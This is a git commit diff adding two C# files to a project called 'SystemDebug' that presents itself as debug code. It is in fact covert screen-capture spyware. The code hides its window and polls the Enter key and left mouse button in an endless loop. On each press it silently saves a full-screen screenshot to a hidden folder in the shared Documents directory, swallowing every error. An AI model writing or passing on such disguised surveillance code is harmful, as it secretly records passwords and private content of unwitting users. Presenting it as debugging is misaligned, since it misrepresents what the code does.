03716830f19352fbc91319678a26c7b2d9b8124f
Fredrik Blixth <fredrik.blixth@gmail.com>
2021-12-16 21:56:30 +0100

    Add system debug code.

---
+++ SystemDebug/MainWindow.xaml.cs
@@ -0,0 +1,53 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.Windows.Forms;
+
+namespace SystemDebug
+{
+    /// <summary>
+    /// Interaction logic for MainWindow.xaml
+    /// </summary>
+    public partial class MainWindow
+    {
+        private const int EnterKey = 13;
+        private const int LeftMouse = 1;
+
+        [DllImport("user32.dll")]
+        private static extern int GetAsyncKeyState(int i);
+
+        public MainWindow()
+        {
+            var debugInformationPath =
+                $"{Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments)}\\systemdebug";
+            var keys = new List<int> {EnterKey, LeftMouse};
+
+            InitializeComponent();
+            Hide();
+            CreateFolder(debugInformationPath);
+
+            while (true)
+            {
+                foreach (var keyState in keys.Select(GetAsyncKeyState).Where(keyState => keyState > 0))
+                {
+                    SystemDebugCollector.GatherDebugInformation(debugInformationPath);
+                }
+            }
+        }
+
+        private static void CreateFolder(string path)
+        {
+            if (Directory.Exists(path))
+            {
+                return;
+            }
+
+            var createdDirectory = Directory.CreateDirectory(path);
+
+            createdDirectory.Attributes = FileAttributes.Hidden;
+        }
+    }
+}
---
+++ SystemDebug/SystemDebugCollector.cs
@@ -0,0 +1,39 @@
+﻿using System;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.Windows.Forms;
+
+namespace SystemDebug
+{
+    public static class SystemDebugCollector
+    {
+        public static void GatherDebugInformation(string debugPath)
+        {
+            var screenLeft = SystemInformation.VirtualScreen.Left;
+            var screenTop = SystemInformation.VirtualScreen.Top;
+            var screenWidth = SystemInformation.VirtualScreen.Width;
+            var screenHeight = SystemInformation.VirtualScreen.Height;
+
+            try
+            {
+                using (var bmp = new Bitmap(screenWidth, screenHeight))
+                {
+                    using (var g = Graphics.FromImage(bmp))
+                    {
+                        g.CopyFromScreen(screenLeft, screenTop, 0, 0, bmp.Size);
+                    }
+
+                    var date = DateTime.UtcNow;
+                    var filename =
+                        $"{date.Year}-{date.Month}-{date.Day} {date.Hour}_{date.Minute}_{date.Second}_{date.Millisecond}.png";
+
+
+                    bmp.Save($"{debugPath}\\{filename}", ImageFormat.Png);
+                }
+            }
+            catch (Exception e)
+            {
+            }
+        }
+    }
+}
